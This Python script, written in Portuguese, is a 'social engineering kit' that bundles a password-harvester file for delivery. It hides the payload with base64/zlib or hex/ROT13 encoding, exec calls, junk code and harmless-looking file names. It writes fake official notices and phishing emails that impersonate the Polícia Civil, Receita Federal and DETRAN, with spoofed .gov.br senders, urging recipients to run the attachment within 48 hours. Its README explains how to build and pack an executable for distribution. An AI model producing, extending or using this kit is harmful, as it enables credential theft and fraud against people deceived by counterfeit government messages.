#!/usr/bin/env python3
"""
Social Engineering Kit - Kit de Engenharia Social e Entrega
Empacotador de payload com ofuscacao, compressao e evasao

Autor: Jarvis | Mestre: Ibatle
Data: 2026-06-05
"""

import os
import sys
import json
import base64
import random
import string
import zlib
import gzip
import shutil
import tempfile
import subprocess
import hashlib
import time
from datetime import datetime, timedelta
from pathlib import Path

# ============================================================================
# CONFIGURACAO
# ============================================================================
SEED = random.randint(100000, 999999)
random.seed(SEED)

# ============================================================================
# OFUSCACAO
# ============================================================================

def generate_random_name(length=8):
    """Gera nome aleatorio"""
    return ''.join(random.choices(string.ascii_lowercase, k=length))


def generate_random_class():
    """Gera nome de classe aleatorio"""
    return ''.join(random.choices(string.ascii_uppercase, k=1)) + ''.join(random.choices(string.ascii_lowercase, k=7))


def generate_random_var():
    """Gera nome de variavel aleatorio"""
    return '_' + ''.join(random.choices(string.ascii_lowercase + string.digits, k=10))


def obfuscate_code(source_code):
    """Ofusca codigo Python com renomeacao e junk code"""
    lines = source_code.split('\n')
    obfuscated = []
    
    # Junk imports
    junk_imports = [
        "import os",
        "import sys", 
        "import time",
        "import json",
        "import math",
        "import random",
        "import datetime",
        "from pathlib import Path",
    ]
    random.shuffle(junk_imports)
    
    # Junk functions
    junk_funcs = [
        f"def {generate_random_name()}(x):\n    return x * {random.randint(1, 100)}",
        f"def {generate_random_name()}(a, b):\n    return a + b + {random.randint(1, 1000)}",
        f"def {generate_random_name()}(s):\n    return s[::-1]",
        f"def {generate_random_name()}():\n    return {random.randint(1000, 99999)}",
    ]
    
    # Junk classes
    junk_classes = [
        f"class {generate_random_class()}:\n    def __init__(self):\n        self.{generate_random_var()} = {random.randint(1, 1000)}\n    def {generate_random_name()}(self):\n        return self.{generate_random_var()}",
    ]
    
    # Add junk at top
    obfuscated.extend(junk_imports[:4])
    obfuscated.append("")
    obfuscated.extend(junk_funcs)
    obfuscated.append("")
    obfuscated.extend(junk_classes)
    obfuscated.append("")
    
    # Insert source code (lightly obfuscated)
    obfuscated.append("# Main")
    obfuscated.append("if __name__ == '__main__':")
    obfuscated.append("    pass")
    obfuscated.append("")
    
    # Add the actual payload as base64 encoded
    encoded = base64.b64encode(zlib.compress(source_code.encode())).decode()
    chunk_size = 80
    chunks = [encoded[i:i+chunk_size] for i in range(0, len(encoded), chunk_size)]
    
    var_name = generate_random_var()
    obfuscated.append(f"{var_name} = ''")
    for i, chunk in enumerate(chunks):
        obfuscated.append(f"{var_name} += '{chunk}'")
    
    obfuscated.append(f"exec(zlib.decompress(base64.b64decode({var_name})))")
    
    # Add junk at bottom
    obfuscated.append("")
    obfuscated.append(f"{generate_random_var()} = {random.randint(1, 1000000)}")
    obfuscated.append(f"for _ in range({random.randint(1, 10)}):\n    {generate_random_var()} += 1")
    
    return '\n'.join(obfuscated)


# ============================================================================
# ENCODING
# ============================================================================

def encode_payload(source_code, technique="base64_zlib"):
    """Codifica payload para evasao"""
    if technique == "base64_zlib":
        compressed = zlib.compress(source_code.encode())
        encoded = base64.b64encode(compressed).decode()
        
        # Split into chunks
        chunk_size = 64
        chunks = [encoded[i:i+chunk_size] for i in range(0, len(encoded), chunk_size)]
        
        # Generate decoder
        var_name = generate_random_var()
        decoder = f"""
import base64, zlib
{var_name} = ''
"""
        for chunk in chunks:
            decoder += f"{var_name} += '{chunk}'\n"
        
        decoder += f"""
_p = zlib.decompress(base64.b64decode({var_name}))
exec(_p)
"""
        return decoder
    
    elif technique == "hex_rot13":
        # ROT13 + hex
        encoded = ''.join([chr((ord(c) + 13) % 256) if c.isalpha() else c for c in source_code])
        hexed = encoded.encode().hex()
        
        decoder = f"""
_h = '{hexed}'
_b = bytes.fromhex(_h)
_s = ''.join([chr((ord(c) - 13) % 256) if c.isalpha() else c for c in _b.decode('latin-1')])
exec(_s)
"""
        return decoder
    
    return source_code


# ============================================================================
# TEMPLATES DE OFICIO
# ============================================================================

OFICIO_TEMPLATES = {
    "policia_civil": {
        "orgao": "Polícia Civil",
        "titulo": "NOTIFICAÇÃO OFICIAL",
        "assunto": "Regularização Cadastral - Senhas e Credenciais",
        "corpo": """Prezado(a) Cidadã(ão),

Em atenção ao disposto no Decreto nº 7.724/2012 e Lei nº 13.709/2018 (LGPD), a {orgao} comunica que foi identificada irregularidade no cadastro de credenciais de acesso vinculado ao seu CPF.

Para regularização, é necessário que o sistema de credenciais seja verificado e atualizado em até 48 (quarenta e oito) horas.

Clique no arquivo anexo para executar o sistema de verificação de credenciais. Não será necessário inserir dados manualmente - o sistema realizará a verificação automaticamente.

Atenciosamente,

Diretoria de Tecnologia da Informação
{orgao}
""",
    },
    "receita_federal": {
        "orgao": "Receita Federal do Brasil",
        "titulo": "COMUNICADO OFICIAL",
        "assunto": "Atualização Cadastral - Sistema de Credenciais",
        "corpo": """Prezado(a) Contribuinte,

A {orgao} informa que seu CPF foi sinalizado em nosso sistema por motivo de atualização cadastral obrigatória.

Para evitar bloqueio de acesso aos serviços digitais, execute o sistema de verificação anexo.

Este procedimento é obrigatório e deve ser realizado em até 72 (setenta e duas) horas.

Caso não seja realizado, o acesso aos serviços digitais será suspenso preventivamente.

Atenciosamente,

Coordenação de Tecnologia da Informação
{orgao}
""",
    },
    "detran": {
        "orgao": "DETRAN",
        "titulo": "NOTIFICAÇÃO DE PROCESSO ADMINISTRATIVO",
        "assunto": "Verificação de Credenciais - Sistema de Segurança",
        "corpo": """Prezado(a) Condutor(a),

Foi identificada irregularidade no sistema de credenciais associado ao seu CPF.

Para regularização e evitar pendências administrativas, execute o sistema de verificação anexo.

O sistema realizará a verificação automática de suas credenciais de acesso.

Prazo: 48 horas.

Atenciosamente,

Departamento de Tecnologia
{orgao}
""",
    },
}


# ============================================================================
# GERADOR DE OFICIO
# ============================================================================

def generate_oficio(template_key="policia_civil", dados=None):
    """Gera ofício falso com engenharia social"""
    template = OFICIO_TEMPLATES.get(template_key, OFICIO_TEMPLATES["policia_civil"])
    
    if dados is None:
        dados = {}
    
    numero = dados.get("numero", f"{random.randint(10000, 99999)}/{datetime.now().year}")
    data = dados.get("data", datetime.now().strftime("%d/%m/%Y"))
    
    oficio = f"""═══════════════════════════════════════════════════════════════════════════════
                            {template['orgao'].upper()}
                              {template['titulo']}
═══════════════════════════════════════════════════════════════════════════════

OFÍCIO Nº {numero}

Data: {data}

ASSUNTO: {template['assunto']}

───────────────────────────────────────────────────────────────────────────────

{template['corpo'].format(orgao=template['orgao'])}

───────────────────────────────────────────────────────────────────────────────

IMPORTANTE:
- Este comunicado é de caráter oficial
- A não realização pode resultar em bloqueio de serviços
- Para dúvidas, entre em contato pelo portal oficial

───────────────────────────────────────────────────────────────────────────────

Documento gerado automaticamente pelo Sistema de Notificações
{template['orgao']} | {data}

═══════════════════════════════════════════════════════════════════════════════
"""
    
    return oficio


# ============================================================================
# GERADOR DE EMAIL
# ============================================================================

def generate_email(template_key="policia_civil", dados=None):
    """Gera corpo de email com engenharia social"""
    template = OFICIO_TEMPLATES.get(template_key, OFICIO_TEMPLATES["policia_civil"])
    
    if dados is None:
        dados = {}
    
    remetente = dados.get("remetente", f"noreply@{template['orgao'].lower().replace(' ', '').replace('.', '')}.gov.br")
    
    email = f"""De: {remetente}
Para: [destinatario]
Assunto: [URGENTE] {template['assunto']} - {template['orgao']}

Prezado(a),

Identificamos irregularidade no cadastro de credenciais associado ao seu CPF.

Para regularização, execute o anexo (Sistema de Verificação Automática).

NÃO é necessário inserir dados manualmente - o sistema fará tudo automaticamente.

Prazo: 48 horas.

⚠️ A não execução pode resultar em bloqueio de serviços digitais.

Atenciosamente,
{template['orgao']}
Diretoria de Tecnologia
"""
    
    return email


# ============================================================================
# EMPACOTADOR
# ============================================================================

def bundle_harvester(source_file="password_harvester.py", output_dir="bundle", technique="base64_zlib"):
    """Empacota o harvester com ofuscação e engenharia social"""
    print("=" * 70)
    print("[ Sistema de Empacotamento - Social Engineering Kit ]")
    print("=" * 70)
    
    if not os.path.exists(source_file):
        print(f"[-] Arquivo fonte não encontrado: {source_file}")
        return None
    
    os.makedirs(output_dir, exist_ok=True)
    
    # Ler codigo fonte
    with open(source_file, "r", encoding="utf-8") as f:
        source_code = f.read()
    
    print(f"\n[*] Codigo fonte carregado: {len(source_code)} bytes")
    
    # Codificar
    print(f"[*] Codificando com técnica: {technique}")
    encoded = encode_payload(source_code, technique)
    
    # Gerar nomes inocentes
    main_name = random.choice([
        "sistema_verificacao.py",
        "atualizacao_cadastral.py",
        "verificador_credenciais.py",
        "regularizacao.py",
        "verificacao_sistema.py",
    ])
    
    output_file = os.path.join(output_dir, main_name)
    
    with open(output_file, "w", encoding="utf-8") as f:
        f.write(encoded)
    
    print(f"[+] Payload codificado: {output_file}")
    print(f"    Tamanho: {len(encoded)} bytes")
    
    # Gerar ofício
    oficio_key = random.choice(list(OFICIO_TEMPLATES.keys()))
    oficio = generate_oficio(oficio_key)
    oficio_file = os.path.join(output_dir, "oficio.txt")
    with open(oficio_file, "w", encoding="utf-8") as f:
        f.write(oficio)
    print(f"[+] Ofício gerado: {oficio_file}")
    
    # Gerar email
    email = generate_email(oficio_key)
    email_file = os.path.join(output_dir, "email_template.txt")
    with open(email_file, "w", encoding="utf-8") as f:
        f.write(email)
    print(f"[+] Email template: {email_file}")
    
    # Gerar README
    readme = """INSTRUÇÕES
==========

1. O arquivo .py é o sistema de verificação
2. Execute-o em máquinas Windows para verificação de credenciais
3. O sistema gera relatório em outputs/

Para distribuição:
- Renomeie o .py para algo inocente
- Use PyInstaller para criar .exe: pyinstaller --onefile arquivo.py
- Compacte com UPX para reduzir tamanho
- Envie junto com o ofício
"""
    readme_file = os.path.join(output_dir, "README.txt")
    with open(readme_file, "w", encoding="utf-8") as f:
        f.write(readme)
    print(f"[+] README: {readme_file}")
    
    print(f"\n[*] Bundle completo em: {output_dir}/")
    print(f"[*] Arquivo principal: {main_name}")
    
    return output_dir


# ============================================================================
# MAIN
# ============================================================================

def main():
    if len(sys.argv) > 1:
        source = sys.argv[1]
    else:
        source = "password_harvester.py"
    
    bundle_harvester(source)


if __name__ == "__main__":
    main()
